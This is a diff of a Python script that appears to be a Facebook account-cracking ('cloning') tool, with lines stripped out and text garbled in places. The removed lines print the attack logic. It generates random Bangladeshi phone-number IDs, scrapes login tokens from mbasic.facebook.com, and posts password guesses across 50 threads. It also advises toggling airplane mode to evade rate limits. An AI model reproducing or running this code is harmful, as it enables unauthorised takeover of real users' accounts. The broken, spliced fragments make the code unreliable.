@@ -81,15 +81,7 @@ p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,xr,u,b])
 my_color = [
  P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-logo = ("""
+
     \033[38;5;46m______  \x1b[38;5;196m__  ___  \033[37;1m____   \033[33;1m___     \033[34;1m_   __
    \033[38;5;46m/ ____/ \x1b[38;5;196m/  |/  / \033[37;1m/ __ \ \033[33;1m/   |   \033[34;1m/ | / /
   \033[38;5;46m/ __/   \x1b[38;5;196m/ /|_/ / \033[37;1m/ /_/ /\033[33;1m/ /| |  \033[34;1m/  |/ / 
@@ -112,34 +104,7 @@ oks = []
 cps = []
 
 def clear():
-    os.system('clear')
-    print(logo)
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-    
-    
-try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 5.2
-    update = ('5.2')
-    update = ('5.2')
-    if str(v) in update:
-        os.system('clear')
-    else:pass
-except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
-#global functions
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
+    ();time.sleep(1)
 
 #User agents
 ugen2=[]
@@ -195,74 +160,4 @@ def samiya(uid):
     
     
     
-# APK CHECK
-def xxr():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
-    print(" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
-    rk1 = '0171'
-    rk2 = '0172'
-    rk3 = '0175'
-    code = random.choice([rk1,rk2,rk3])                      
-    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
-    os.system('clear')
-    print(logo)
-    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 2000, 3000, 5000 \n \033[1;93m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥\n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = 0
-    HamiiID = []
-    print("")
-    for bilal in range(passx):
-        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[38;5;46m Enter Password {bilal+1} : ")
-        HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
-        clear()
-        tl = str(len(user))
-        print(f' \033[1;91m[\033[1;97m🐼\033[1;91m]\033[38;5;46m TOTAL IDS: {xr}'+tl)
-        print(f'{x} \033[1;91m[\033[1;97m🐼\033[1;91m]\033[38;5;46m THE PROCESS HAS BEEN STARTED')
-        print(f' \033[1;91m[\033[1;97m🐼\033[1;91m]\033[38;5;46m WORK CUNTRY \033[1;97m: \x1b[38;5;196mBANGLADESH')
-        print(f' \033[1;91m[\033[1;97m🐼\033[1;91m]\033[38;5;46m TOOL OWNER \033[1;97m: \x1b[38;5;196mCYBER KING EMRAN')
-        print(f' \033[1;91m[\033[1;97m🐼\033[1;91m]\033[38;5;46m USE NETWORK  \033[1;97m:  \x1b[38;5;196m2G, 3G, 4G, 5G ')
-        print(f' \033[1;91m[\033[1;97m🐼\033[1;91m]\033[38;5;46m USE AEROPLANE MOOD IN EVERY 5 MIN ')
-        print(" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
-        for love in user:
-            pwx = [love[1:]]
-            uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(love)
-            manshera.submit(rcrack,uid,pwx,tl)
-    print(" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            'method':'GET',
-            '
+# 
